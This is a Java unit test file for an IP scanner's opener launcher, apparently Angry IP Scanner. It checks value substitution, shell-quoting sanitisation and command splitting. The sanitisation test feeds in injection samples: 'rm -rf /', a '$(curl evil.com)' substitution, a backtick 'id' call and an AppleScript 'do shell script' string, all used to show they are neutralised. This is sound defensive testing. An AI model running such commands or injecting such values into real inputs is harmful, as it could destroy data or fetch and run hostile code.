package net.azib.ipscan.gui.actions;

import net.azib.ipscan.config.Labels;
import net.azib.ipscan.core.ScanningResultList;
import net.azib.ipscan.core.UserErrorException;
import net.azib.ipscan.core.values.InetAddressHolder;
import net.azib.ipscan.core.values.IntegerWithUnit;
import net.azib.ipscan.core.values.NotAvailable;
import net.azib.ipscan.feeders.Feeder;
import net.azib.ipscan.fetchers.FetcherRegistry;
import net.azib.ipscan.fetchers.HostnameFetcher;
import net.azib.ipscan.fetchers.IPFetcher;
import net.azib.ipscan.fetchers.PingFetcher;
import org.junit.Test;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Collections;

import static org.junit.Assert.*;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

/**
 * OpenerLauncherTest
 *
 * @author Anton Keks
 */
public class OpenerLauncherTest {
	@Test
	public void testReplaceValues() throws UnknownHostException {
		var fetcherRegistry = mock(FetcherRegistry.class);
		when(fetcherRegistry.getSelectedFetchers()).thenReturn(Collections.nCopies(5, null));
		when(fetcherRegistry.getSelectedFetcherIndex(IPFetcher.ID)).thenReturn(0);
		when(fetcherRegistry.getSelectedFetcherIndex(HostnameFetcher.ID)).thenReturn(1);
		when(fetcherRegistry.getSelectedFetcherIndex(PingFetcher.ID)).thenReturn(2);
		when(fetcherRegistry.getSelectedFetcherIndex("fetcher.comment")).thenReturn(3);
		when(fetcherRegistry.getSelectedFetcherIndex("noSuchFetcher")).thenReturn(-1);

		var scanningResults = new ScanningResultList(fetcherRegistry);
		scanningResults.initNewScan(mockFeeder("info"));
		var result = scanningResults.createResult(InetAddress.getByName("127.0.0.1"));
		result.setValue(0, new InetAddressHolder(InetAddress.getByName("127.0.0.1")));
		result.setValue(1, "HOSTNAME");
		result.setValue(2, new IntegerWithUnit(10, "ms"));
		scanningResults.registerAtIndex(0, result);

		var ol = new OpenerLauncher(fetcherRegistry, scanningResults);
		
		// sanitize=false: raw substitution (used for URL openers)
		assertEquals("\\\\127.0.0.1", ol.prepareOpenerStringForItem("\\\\${fetcher.ip}", 0, false));
		assertEquals("HOSTNAME$$$127.0.0.1xxx${}", ol.prepareOpenerStringForItem("${fetcher.hostname}$$$${fetcher.ip}xxx${}", 0, false));
		assertEquals("http://127.0.0.1:80/www", ol.prepareOpenerStringForItem("http://${fetcher.ip}:80/www", 0, false));
		assertEquals(result.getValues().get(2) + ", xx", ol.prepareOpenerStringForItem("${fetcher.ping}, xx", 0, false));

		// sanitize=true: values wrapped in single quotes (used for shell openers)
		assertEquals("\\\\'127.0.0.1'", ol.prepareOpenerStringForItem("\\\\${fetcher.ip}", 0, true));
		assertEquals("'HOSTNAME'$$$'127.0.0.1'xxx${}", ol.prepareOpenerStringForItem("${fetcher.hostname}$$$${fetcher.ip}xxx${}", 0, true));
		assertEquals("http://'127.0.0.1':80/www", ol.prepareOpenerStringForItem("http://${fetcher.ip}:80/www", 0, true));
				
		try {
			ol.prepareOpenerStringForItem("${noSuchFetcher}", 0, false);
			fail();
		}
		catch (UserErrorException e) {
			assertEquals(Labels.getLabel("exception.UserErrorException.opener.unknownFetcher") + "noSuchFetcher", e.getMessage());
		}

		try {
			ol.prepareOpenerStringForItem("${fetcher.comment}", 0, false);
			fail();
		}
		catch (UserErrorException e) {
			assertEquals(Labels.getLabel("exception.UserErrorException.opener.nullFetcherValue") + "fetcher.comment", e.getMessage());
		}

		try {
			result.setValue(3, NotAvailable.VALUE);
			ol.prepareOpenerStringForItem("${fetcher.comment}", 0, false);
			fail();
		}
		catch (UserErrorException e) {
			assertEquals(Labels.getLabel("exception.UserErrorException.opener.nullFetcherValue") + "fetcher.comment", e.getMessage());
		}
		
		result.setValue(1, null);
		assertEquals("Hostname opening should fall back to the IP", "127.0.0.1", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0, false));
		assertEquals("Hostname opening should fall back to the IP", "'127.0.0.1'", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0, true));
		result.setValue(1, NotAvailable.VALUE);
		assertEquals("Hostname opening should fall back to the IP", "127.0.0.1", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0, false));
	}
	
	@Test
	public void testSanitizeForShell() {
		// normal values are wrapped in single quotes
		assertEquals("'hostname'", OpenerLauncher.sanitizeForShell("hostname"));
		assertEquals("'192.168.1.1'", OpenerLauncher.sanitizeForShell("192.168.1.1"));

		// empty value
		assertEquals("''", OpenerLauncher.sanitizeForShell(""));

		// single quotes inside the value are escaped
		assertEquals("'it'\\''s'", OpenerLauncher.sanitizeForShell("it's"));

		// shell metacharacters are neutralized inside single quotes
		assertEquals("'; rm -rf /'", OpenerLauncher.sanitizeForShell("; rm -rf /"));
		assertEquals("'$(curl evil.com)'", OpenerLauncher.sanitizeForShell("$(curl evil.com)"));
		assertEquals("'`id`'", OpenerLauncher.sanitizeForShell("`id`")); // backticks are literal inside ''
		assertEquals("'a|b&c>d<e'", OpenerLauncher.sanitizeForShell("a|b&c>d<e"));

		// Windows cmd metacharacters are also neutralized
		assertEquals("'a&b|c>d^e%'", OpenerLauncher.sanitizeForShell("a&b|c>d^e%"));

		// AppleScript injection attempt
		assertEquals("'\" & do shell script \"evil\" & \"'", OpenerLauncher.sanitizeForShell("\" & do shell script \"evil\" & \""));
	}

	@Test
	public void testCommandSplitting() throws Exception {
		assertArrayEquals(new String[] {"hello", "world"}, OpenerLauncher.splitCommand("hello world"));
		assertArrayEquals(new String[] {"echo", "hello world", "muha-ha"}, OpenerLauncher.splitCommand("echo 'hello world' muha-ha"));
		assertArrayEquals(new String[] {"echo", "hello world", "muha-ha"}, OpenerLauncher.splitCommand("echo \"hello world\" muha-ha"));
		assertArrayEquals(new String[] {"mix \"1", "mix '2"}, OpenerLauncher.splitCommand("'mix \"1' \"mix '2\""));
		assertArrayEquals(new String[] {"\"aaa"}, OpenerLauncher.splitCommand("\"aaa"));
		// single quoted value with no embedded whitespace (as produced by sanitizeForShell) must be fully unquoted
		assertArrayEquals(new String[] {"notepad", "192.168.1.1"}, OpenerLauncher.splitCommand("notepad '192.168.1.1'"));
		assertArrayEquals(new String[] {"notepad", "192.168.1.1"}, OpenerLauncher.splitCommand("notepad \"192.168.1.1\""));
	}
	
	private Feeder mockFeeder(String feederInfo) {
		var feeder = mock(Feeder.class);
		when(feeder.getInfo()).thenReturn(feederInfo);
		when(feeder.getName()).thenReturn("feeder.range");
		return feeder;
	}
}
